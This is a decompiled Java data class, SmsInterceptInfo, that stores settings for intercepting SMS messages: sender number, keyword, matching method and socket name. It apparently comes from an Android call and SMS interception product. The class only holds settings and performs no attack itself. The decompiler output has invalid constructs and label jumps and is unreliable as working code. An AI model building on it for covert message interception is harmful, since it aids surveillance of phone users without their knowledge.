package com.vvt.base.communication;

import java.io.Serializable;

public class SmsInterceptInfo
  implements Serializable
{
  public static final String REGEX_EXTRACTING_PHONE_NUMBER = "([+][0-9]{1}+)?[ ]*[-]*[(]*[0-9]{1}+([0-9]?[(]?[ ]*[-]?[0-9]?[)]?)*";
  private static final long serialVersionUID = 2248422302407589129L;
  private String clientSocketName;
  private SmsInterceptInfo.InterceptionMethod interceptionMethod;
  private String keyword;
  private SmsInterceptInfo.KeywordFindingMethod keywordFindingMethod;
  private String ownerPackage;
  private String senderNumber;
  
  public SmsInterceptInfo()
  {
    Object localObject = SmsInterceptInfo.InterceptionMethod.NOT_INTERCEPT;
    this.interceptionMethod = ((SmsInterceptInfo.InterceptionMethod)localObject);
    localObject = SmsInterceptInfo.KeywordFindingMethod.NOT_SPECIFIED;
    this.keywordFindingMethod = ((SmsInterceptInfo.KeywordFindingMethod)localObject);
    this.ownerPackage = "";
    this.clientSocketName = "";
    this.senderNumber = "";
    this.keyword = "";
  }
  
  public boolean equals(Object paramObject)
  {
    boolean bool1 = true;
    boolean bool2 = paramObject instanceof SmsInterceptInfo;
    Object localObject1;
    Object localObject2;
    String str1;
    boolean bool5;
    label179:
    boolean bool6;
    if (bool2)
    {
      paramObject = (SmsInterceptInfo)paramObject;
      localObject1 = this.interceptionMethod;
      localObject2 = ((SmsInterceptInfo)paramObject).getInterceptionMethod();
      boolean bool3 = ((SmsInterceptInfo.InterceptionMethod)localObject1).equals(localObject2);
      localObject1 = this.keywordFindingMethod;
      localObject2 = ((SmsInterceptInfo)paramObject).getKeywordFindingMethod();
      boolean bool4 = ((SmsInterceptInfo.KeywordFindingMethod)localObject1).equals(localObject2);
      localObject1 = this.clientSocketName;
      if (localObject1 != null)
      {
        localObject1 = this.clientSocketName;
        localObject2 = ((SmsInterceptInfo)paramObject).getClientSocketName();
        bool2 = ((String)localObject1).equals(localObject2);
        if (bool2) {}
      }
      else
      {
        localObject1 = this.clientSocketName;
        if (localObject1 != null) {
          break label267;
        }
        localObject1 = ((SmsInterceptInfo)paramObject).getClientSocketName();
        if (localObject1 != null) {
          break label267;
        }
      }
      bool2 = bool1;
      localObject2 = this.senderNumber;
      if (localObject2 != null)
      {
        localObject2 = this.senderNumber;
        str1 = ((SmsInterceptInfo)paramObject).getSenderNumber();
        bool5 = ((String)localObject2).equals(str1);
        if (bool5) {}
      }
      else
      {
        localObject2 = this.senderNumber;
        if (localObject2 != null) {
          break label275;
        }
        localObject2 = ((SmsInterceptInfo)paramObject).getSenderNumber();
        if (localObject2 != null) {
          break label275;
        }
      }
      bool5 = bool1;
      str1 = this.keyword;
      if (str1 != null)
      {
        str1 = this.keyword;
        String str2 = ((SmsInterceptInfo)paramObject).getKeyword();
        bool6 = str1.equals(str2);
        if (bool6) {}
      }
      else
      {
        str1 = this.keyword;
        if (str1 != null) {
          break label284;
        }
        str1 = ((SmsInterceptInfo)paramObject).getKeyword();
        if (str1 != null) {
          break label284;
        }
      }
      bool6 = bool1;
      label241:
      if ((!bool3) || (!bool4) || (!bool2) || (!bool5) || (!bool6)) {}
    }
    for (;;)
    {
      return bool1;
      label267:
      bool2 = false;
      localObject1 = null;
      break;
      label275:
      bool5 = false;
      localObject2 = null;
      break label179;
      label284:
      bool6 = false;
      str1 = null;
      break label241;
      bool1 = false;
      continue;
      bool1 = false;
    }
  }
  
  public String getClientSocketName()
  {
    return this.clientSocketName;
  }
  
  public SmsInterceptInfo.InterceptionMethod getInterceptionMethod()
  {
    return this.interceptionMethod;
  }
  
  public String getKeyword()
  {
    return this.keyword;
  }
  
  public SmsInterceptInfo.KeywordFindingMethod getKeywordFindingMethod()
  {
    return this.keywordFindingMethod;
  }
  
  public String getOwnerPackage()
  {
    return this.ownerPackage;
  }
  
  public String getSenderNumber()
  {
    return this.senderNumber;
  }
  
  public int hashCode()
  {
    int i = 0;
    String str1 = null;
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    int j = this.interceptionMethod.hashCode();
    localStringBuilder.append(j);
    j = this.keywordFindingMethod.hashCode();
    localStringBuilder.append(j);
    String str2 = this.clientSocketName;
    if (str2 == null)
    {
      j = 0;
      str2 = null;
      localStringBuilder.append(j);
      str2 = this.senderNumber;
      if (str2 != null) {
        break label142;
      }
      j = 0;
      str2 = null;
      label85:
      localStringBuilder.append(j);
      str2 = this.keyword;
      if (str2 != null) {
        break label158;
      }
    }
    for (;;)
    {
      localStringBuilder.append(i);
      j = -1;
      try
      {
        str1 = localStringBuilder.toString();
        j = Integer.parseInt(str1);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        for (;;) {}
      }
      return j;
      str2 = this.clientSocketName;
      j = str2.hashCode();
      break;
      label142:
      str2 = this.senderNumber;
      j = str2.hashCode();
      break label85;
      label158:
      str2 = this.keyword;
      i = str2.hashCode();
    }
  }
  
  public void setClientSocketName(String paramString)
  {
    this.clientSocketName = paramString;
  }
  
  public void setInterceptionMethod(SmsInterceptInfo.InterceptionMethod paramInterceptionMethod)
  {
    this.interceptionMethod = paramInterceptionMethod;
  }
  
  public void setKeyword(String paramString)
  {
    this.keyword = paramString;
  }
  
  public void setKeywordFindingMethod(SmsInterceptInfo.KeywordFindingMethod paramKeywordFindingMethod)
  {
    this.keywordFindingMethod = paramKeywordFindingMethod;
  }
  
  public void setOwnerPackage(String paramString)
  {
    this.ownerPackage = paramString;
  }
  
  public void setSenderNumber(String paramString)
  {
    this.senderNumber = paramString;
  }
  
  public String toString()
  {
    Object[] arrayOfObject = new Object[6];
    String str = this.ownerPackage;
    arrayOfObject[0] = str;
    str = this.interceptionMethod.toString();
    arrayOfObject[1] = str;
    str = this.keywordFindingMethod.toString();
    arrayOfObject[2] = str;
    str = this.clientSocketName;
    arrayOfObject[3] = str;
    str = this.senderNumber;
    arrayOfObject[4] = str;
    str = this.keyword;
    arrayOfObject[5] = str;
    return String.format("owner=%s, intercept=%s, finding=%s, client=%s, sender=%s, keyword=%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/base/communication/SmsInterceptInfo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */